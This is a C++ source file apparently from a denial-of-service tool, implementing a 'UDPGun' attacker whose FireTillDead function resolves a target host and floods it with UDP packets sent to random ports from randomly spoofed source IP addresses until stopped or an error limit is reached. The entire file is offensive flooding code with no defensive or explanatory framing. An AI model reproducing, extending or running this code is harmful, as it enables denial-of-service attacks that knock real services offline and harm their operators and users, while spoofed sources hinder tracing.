#include <arpa/inet.h>

#include "udp_gun.h"

#include "config.h"
#include "net_utils.h"
#include "utils.h"

std::size_t Attackers::UDPGun::FireTillDead(const URI &targetToKill) noexcept
{
	std::size_t hitsCount{0};

	// Resolving address
	URI destAdress;
	if(const auto resolved = NetUtil::GetHostAddresses(targetToKill))
	{
		// Beggining attack
		std::array<char, INET_ADDRSTRLEN> ipString;
		for(struct addrinfo *addr = resolved->get(); 
			addr != nullptr && !m_currentTask.ShouldStop(); 
			addr = addr->ai_next)
		{
			struct sockaddr_in &addrIn = *reinterpret_cast<sockaddr_in *>(addr->ai_addr);

			if(inet_ntop(AF_INET, &addrIn.sin_addr, ipString.data(), ipString.size()) == nullptr)
			{
				SPDLOG_WARN("Failed to translate resolved address from {}", targetToKill);
				continue;
			}

			URI destAdress{ipString.data()};

			SPDLOG_INFO("Firing UDP at {} resolved to: {}", targetToKill, destAdress);

			URI randomSourceAdress;

			std::size_t errorsCount = 0;

			for(std::size_t attacksCount = 0; 
				attacksCount < AttackerConfig::UDPAttacker::MAX_ATTACKS_BEFORE_CHECK &&
				!m_currentTask.ShouldStop(); attacksCount++)
			{
				destAdress.SetPort(NetUtil::GetRandomPort());

				randomSourceAdress = NetUtil::GetRandomIP() + ':' +
					std::to_string(NetUtil::GetRandomPort());
				bool gotError = !m_flooder.SendPacket(randomSourceAdress, destAdress);
				if(gotError)
				{
					if(++errorsCount == AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
					{
						break;
					}
				}
				else
				{
					++hitsCount;
				}
			}
			if(errorsCount == AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				SPDLOG_ERROR("Max errors count reached, stoping UDP attack");
				break;
			}
		}
	}
	else
	{
		SPDLOG_WARN("Failed to resolve IP adress of: {}", targetToKill);
	}

	return hitsCount;
}
